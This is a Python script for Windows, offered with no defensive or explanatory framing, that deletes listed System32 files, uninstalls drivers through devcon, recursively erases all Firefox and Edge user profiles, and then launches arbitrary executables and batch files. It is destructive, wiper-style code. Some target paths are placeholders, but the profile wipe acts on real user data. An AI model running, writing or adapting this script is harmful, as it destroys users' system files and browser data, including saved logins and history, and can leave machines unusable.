import os
import subprocess

important_files_to_delete = [
    "C:\\Windows\\System32\\file1.exe",
    "C:\\Windows\\System32\\file2.dll",
]

drivers_to_uninstall = [
    "C:\\Windows\\INF\\driver1.inf",
    "C:\\Windows\\INF\\driver2.sys",
]

firefox_profile_dir = os.path.join(os.environ["LOCALAPPDATA"], "Mozilla", "Firefox", "Profiles")
edge_profile_dir = os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data")

files_to_launch = [
    "C:\\Path\\To\\File1.exe",
    "C:\\Path\\To\\File2.bat",
]

def delete_important_files():
    for file_path in important_files_to_delete:
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                print(f"Deleted: {file_path}")
            else:
                print(f"File not found: {file_path}")
        except Exception as e:
            print(f"Failed to delete {file_path}. Error: {e}")

def uninstall_drivers():
    try:
        for driver_file in drivers_to_uninstall:
            if os.path.exists(driver_file):
                subprocess.run(["devcon.exe", "remove", driver_file], check=True)
                print(f"Uninstalled driver: {driver_file}")
            else:
                print(f"Driver file not found: {driver_file}")
    except Exception as e:
        print("Failed to uninstall drivers. Error:", e)

def remove_browser_profiles(browser, profile_dir):
    if os.path.exists(profile_dir):
        try:
            import shutil
            if browser.lower() == "firefox":
                for profile_folder in os.listdir(profile_dir):
                    if os.path.isdir(os.path.join(profile_dir, profile_folder)):
                        shutil.rmtree(os.path.join(profile_dir, profile_folder))
                print("Firefox profiles removed.")
            elif browser.lower() == "edge":
                for profile_folder in os.listdir(profile_dir):
                    if os.path.isdir(os.path.join(profile_dir, profile_folder)):
                        shutil.rmtree(os.path.join(profile_dir, profile_folder))
                print("Edge profiles removed.")
        except Exception as e:
            print(f"Failed to remove {browser} profiles. Error: {e}")

def launch_files():
    try:
        for file_path in files_to_launch:
            if os.path.exists(file_path):
                subprocess.Popen([file_path])
                print(f"Launched: {file_path}")
            else:
                print(f"File not found: {file_path}")
    except Exception as e:
        print("Failed to launch files. Error:", e)

if __name__ == "__main__":
    
    print("Proceeding with file deletion, driver uninstallation, and more system modifications...")
    
    delete_important_files()
    uninstall_drivers()

    remove_browser_profiles("Firefox", firefox_profile_dir)
    
    remove_browser_profiles("Edge", edge_profile_dir)

    launch_files()

